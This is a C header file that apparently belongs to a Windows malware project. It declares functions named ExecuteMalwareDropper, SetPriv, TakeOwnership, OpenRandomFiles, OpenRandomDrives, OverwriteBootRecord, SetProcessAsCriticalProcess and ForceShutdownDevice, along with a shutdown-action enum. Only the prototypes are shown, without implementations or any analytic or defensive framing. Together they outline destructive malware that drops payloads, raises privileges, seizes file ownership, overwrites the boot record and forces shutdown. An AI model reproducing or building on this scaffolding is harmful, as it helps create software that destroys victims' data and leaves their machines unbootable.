#pragma once
#include "phosphorium.h"

#define NUM_ACES 2

typedef enum _SHUTDOWN_ACTION {
	ShutdownNoReboot,
	ShutdownReboot,
	ShutdownPowerOff
} SHUTDOWN_ACTION, * PSHUTDOWN_ACTION;

BOOL
WINAPI
ExecuteMalwareDropper(VOID);

BOOL
WINAPI
SetPriv(
	_In_ HANDLE hToken,
	_In_ LPCWSTR lpwPrivilege,
	_In_ BOOL blEnablePrivilege
);

BOOL
WINAPI
TakeOwnership(
	_In_ LPCWSTR lpwFile
);

BOOL
WINAPI
OpenRandomFiles(
	_In_ LPCWSTR lpwDir
);

VOID
WINAPI
OpenRandomDrives(VOID);

BOOL
WINAPI
OverwriteBootRecord(VOID);

BOOL
WINAPI
SetProcessAsCriticalProcess(VOID);

BOOL
WINAPI
ForceShutdownDevice(VOID);